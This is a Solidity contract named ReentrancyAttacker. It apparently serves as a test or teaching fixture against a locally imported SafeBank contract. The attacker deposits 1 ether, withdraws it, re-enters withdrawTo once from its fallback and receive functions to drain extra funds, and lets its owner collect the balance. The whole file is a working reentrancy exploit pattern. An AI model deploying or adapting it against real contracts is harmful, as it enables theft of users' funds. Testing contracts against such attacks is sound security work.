// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SafeBank.sol";

contract ReentrancyAttacker {
    address safeBank;
    bool private hasReentered;
    address owner;

    constructor(address bank) {
        safeBank = bank;
        owner = msg.sender;
    }

    function attack() external payable {
        SafeBank(safeBank).deposit{value: 1 ether}();
        SafeBank(safeBank).withdrawTo(payable(address(this)), 1 ether);
    }

    function collect() external payable {
        require(msg.sender == owner, "Only Owner");
        payable(owner).call{value: address(this).balance}("");
    }

    fallback() external payable {
        if (!hasReentered) {
            hasReentered = true;
            (bool ok,) = safeBank.call(abi.encodeWithSignature("withdrawTo(address,uint256)", address(this), 1 ether));
        }
    }

    receive() external payable {
        if (!hasReentered) {
            hasReentered = true;
            (bool ok,) = safeBank.call(abi.encodeWithSignature("withdrawTo(address,uint256)", address(this), 1 ether));
        }
    }
}
